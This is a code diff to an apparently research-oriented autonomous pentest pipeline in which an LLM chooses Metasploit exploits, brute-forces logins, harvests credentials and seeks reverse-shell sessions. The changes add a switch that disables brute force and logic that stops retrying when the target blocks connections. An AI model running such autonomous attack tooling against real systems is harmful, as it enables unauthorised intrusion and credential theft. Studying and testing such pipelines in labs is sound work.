@@ -34,11 +34,12 @@ API_KEY_PATH = "/app/config/api_key.txt"
 os.makedirs(LOOT_DIR, exist_ok=True)
 
 class PentestPipeline(PipelineBase):
-    def __init__(self, target_ip, attacker_ip, use_rag=True, only_port=None):
+    def __init__(self, target_ip, attacker_ip, use_rag=True, only_port=None, allow_brute=True):
         self.target_ip = target_ip
         self.attacker_ip = attacker_ip
         self.use_rag = use_rag
         self.only_port = str(only_port) if only_port else None
+        self.allow_brute = allow_brute
         
         print("=== INICIALIZANDO PIPELINE AUTONOMO (V17 - SINGLE TARGET DIRECT) ===")
         print(f"[*] Alvo Definido: {self.target_ip}") 
@@ -46,6 +47,7 @@ class PentestPipeline(PipelineBase):
         print(f"[*] Wordlist: {WORDLIST_PATH}")
         print(f"[*] Logs serao salvos em: {LOOT_DIR}")
         print(f"[*] Modo RAG: {'HABILITADO' if self.use_rag else 'DESATIVADO (LLM pura / baseline)'}")
+        print(f"[*] Brute force: {'HABILITADO' if self.allow_brute else 'DESATIVADO (so exploits)'}")
         
         self.setup_api_key()
         
@@ -68,6 +70,7 @@ class PentestPipeline(PipelineBase):
         self.session_id = None
         self.manual_access = None  # TIER C: foothold manual (sem sessao MSF)
         self.found_creds = []  # creds obtidas (brute) p/ reuso e chaining
+        self._blocked_ports = set()  # portas cujo host bloqueou conexoes
         self.evidence = {}
     
     def check_port(self, port):
@@ -372,6 +375,7 @@ If the output above already proves execution on the target, set done=true.
             port, banner, fail_note, tried = attack_queue.pop(0)
             _prev_note = ""
             creds_block = ""
+            brute_directive = "" if self.allow_brute else ">>> BRUTE FORCE IS DISABLED for this run: 'brute_force' is NOT an available strategy. NEVER output strategy 'brute_force'. For auth services go straight to an exploit if one matches; otherwise enumeration or skip. <<<"
             if self.found_creds:
                 _cl = [f"{c['user']}:{c['pass']} (port {c['port']} {c['service']})" for c in self.found_creds[:8]]
                 creds_block = "AVAILABLE CREDENTIALS (already obtained; REUSE across services and for authenticated modules): " + "; ".join(_cl)
@@ -430,6 +434,7 @@ If the output above already proves execution on the target, set done=true.
             "{banner}"
             {_prev_note}
             {creds_block}
+            {brute_directive}
             
             ----------------------------------------
             KNOWLEDGE BASE (RAG)
@@ -527,6 +532,9 @@ If the output above already proves execution on the target, set done=true.
                 except: pass
 
             strategy = plan.get('strategy', 'skip').lower()
+            if not self.allow_brute and strategy == "brute_force":
+                print(f"{C_YELLOW}[POLICY] Brute force desativado: ignorando 'brute_force' na porta {port}.{C_RESET}")
+                strategy = "skip"
             module = plan.get('module', '').strip()
             if not module: module = plan.get('module_name', '').strip()
             
@@ -547,7 +555,7 @@ If the output above already proves execution on the target, set done=true.
                 print(f"{C_YELLOW}[AI] O modelo decidiu nao atacar a porta {port}.{C_RESET}")
                 continue
 
-            if "login" in module or "credential" in module: strategy = "brute_force"
+            if self.allow_brute and ("login" in module or "credential" in module): strategy = "brute_force"
 
             if not module.startswith("auxiliary") and not module.startswith("exploit"):
                 if module.startswith("scanner") or module.startswith("admin"):
@@ -626,6 +634,9 @@ If the output above already proves execution on the target, set done=true.
                                                  userpass_file=wl["userpass_file"],
                                                  user_file=wl["user_file"],
                                                  pass_file=wl["pass_file"]) or ""
+                if "is blocked" in out.lower() or "many connection errors" in out.lower():
+                    self._blocked_ports.add(port)
+                    print(f"{C_RED}[CONNECTION WALL] {m_name}: host bloqueou conexoes (max_connect_errors); nao insistir nesta porta.{C_RESET}")
                 creds = re.findall(r"(?:Success|Login Successful|succeeded)[^\n]*", out)
                 for _cl in creds:
                     _m = re.search(r"'([^':]+):([^']*)'", _cl)
@@ -679,6 +690,15 @@ If the output above already proves execution on the target, set done=true.
                             break # SESSAO OBTIDA
                     
                     print(f"{C_RED}[FALHA] Nenhuma sessao obtida na tentativa {attempt}.{C_RESET}")
+                    _low = (mod_output or "").lower()
+                    if ("is blocked" in _low or "many connection errors" in _low
+                            or "connection timed" in _low or "max_connect_errors" in _low):
+                        print(f"{C_RED}[CONNECTION WALL] Alvo recusando/limitando conexoes "
+                              f"(host bloqueado por excesso de erros ou timeout de conexao). "
+                              f"Nao e problema de payload/opcoes e retentar PIORA o bloqueio. "
+                              f"Abortando este modulo e seguindo.{C_RESET}")
+                        self._blocked_ports.add(port)
+                        break
                     
                     # SE FALHOU, PEDE CORREÇÃO DO ERRO
                     if attempt < max_attempts:
@@ -767,7 +787,7 @@ If the output above already proves execution on the target, set done=true.
                         self.run_manual_exploit(port, banner, web_context, rag_context)
 
             if not (self.session_id or self.manual_access):
-                if strategy in ("brute_force", "enumeration", "exploit_cve") and len(tried) + 1 < MAX_STRATS:
+                if strategy in ("brute_force", "enumeration", "exploit_cve") and len(tried) + 1 < MAX_STRATS and port not in self._blocked_ports:
                     attack_queue.insert(0, (port, banner, f"'{strategy}' nao obteve shell", tried + [strategy]))
                     print(f"{C_YELLOW}[*] Estrategia '{strategy}' falhou na porta {port}; reconsultando o LLM por uma estrategia ALTERNATIVA...{C_RESET}")
             if self.session_id or self.manual_access:
@@ -926,6 +946,7 @@ if __name__ == "__main__":
     parser.add_argument("--target", type=str, default=None, help="IP do alvo (ex: 10.0.0.1); se omitido, usa config/target.json")
     parser.add_argument("--disable-rag", action="store_true", help="Desativa o RAG (ChromaDB): roda o modelo isoladamente (baseline).")
     parser.add_argument("--port", type=int, default=None, help="Restringe a analise a UMA porta (ex: 139), para A/B RAG on/off.")
+    parser.add_argument("--no-brute", action="store_true", help="Remove a estrategia brute_force: forca o modelo a usar so exploits.")
     args = parser.parse_args()
 
     target = resolve_target(args.target)
@@ -933,7 +954,7 @@ if __name__ == "__main__":
     # nao o orquestrador: o reverse shell do alvo volta para o MSF host.
     lhost = os.getenv("MSF_RPC_HOST", "192.168.70.20")
 
-    p = PentestPipeline(target_ip=target, attacker_ip=lhost, use_rag=not args.disable_rag, only_port=args.port)
+    p = PentestPipeline(target_ip=target, attacker_ip=lhost, use_rag=not args.disable_rag, only_port=args.port, allow_brute=not args.no_brute)
     try:
         p.run()
         if p.session_id:
